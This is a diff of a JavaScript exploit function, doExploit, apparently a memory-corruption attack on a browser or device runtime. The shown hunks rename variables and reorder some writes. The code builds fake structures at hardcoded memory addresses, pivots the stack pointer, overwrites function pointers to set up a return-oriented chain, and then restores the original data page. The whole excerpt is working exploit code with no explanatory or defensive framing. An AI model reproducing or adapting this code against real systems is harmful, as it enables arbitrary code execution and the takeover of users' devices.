@@ -372,26 +372,26 @@ function doExploit(buf, stale, temp) {
 
 		log('Setting up structs');
 
-		var init = mref(0x91F320);
+		var fixed = mref(0x91F320);
 		var saved = new Uint32Array(0x1000);
 		for(var i = 0; i < 0x1000; ++i)
-			saved[i] = read4(init, i);
+			saved[i] = read4(fixed, i);
 
-		var block1 = malloc(0x200);
-		var block2 = malloc(0x200);
-		write8(block1, init, 0);
-		write8(mref(0x4967F0), init, 2);
-		write8(mref(0x433EB4), init, 4);
-		write8(mref(0x4967F0), init, 0x18 >> 2);
-		write8(block2, init, 0x28 >> 2);
+		var context = malloc(0x200);
+		var block_struct_1 = malloc(0x200);
+		write8(context, fixed, 0);
+		write8(mref(0x4967F0), fixed, 2);
+		write8(mref(0x433EB4), fixed, 4);
+		write8(mref(0x4967F0), fixed, 0x18 >> 2);
+		write8(block_struct_1, fixed, 0x28 >> 2);
 
 		sp = add2(sp, -0x800);
-		write8(mref(0x1A1C98), block1, 0x58 >> 2);
-		write8(sp, block1, 0x68 >> 2);
+		write8(mref(0x1A1C98), context, 0x58 >> 2);
+		write8(sp, context, 0x68 >> 2);
 
 		var regsaveblock = malloc(0x200);
-		write8(mref(0x4336B0), block2, 0x10 >> 2);
-		write8(regsaveblock, block2, 0x28 >> 2);
+		write8(regsaveblock, block_struct_1, 0);
+		write8(mref(0x4336B0), block_struct_1, 0x10 >> 2);
 
 		write8(mref(0x3A278C), sp, 0);
 		write8(mref(0x181E9C), sp, 0x10 >> 2);
@@ -416,7 +416,7 @@ function doExploit(buf, stale, temp) {
 		log('Restored original function pointer.');
 
 		for(var i = 0; i < 0x1000; ++i)
-			write4(saved[i], init, i);
+			write4(saved[i], fixed, i);
 		log('Restored data page.');
 	}
 
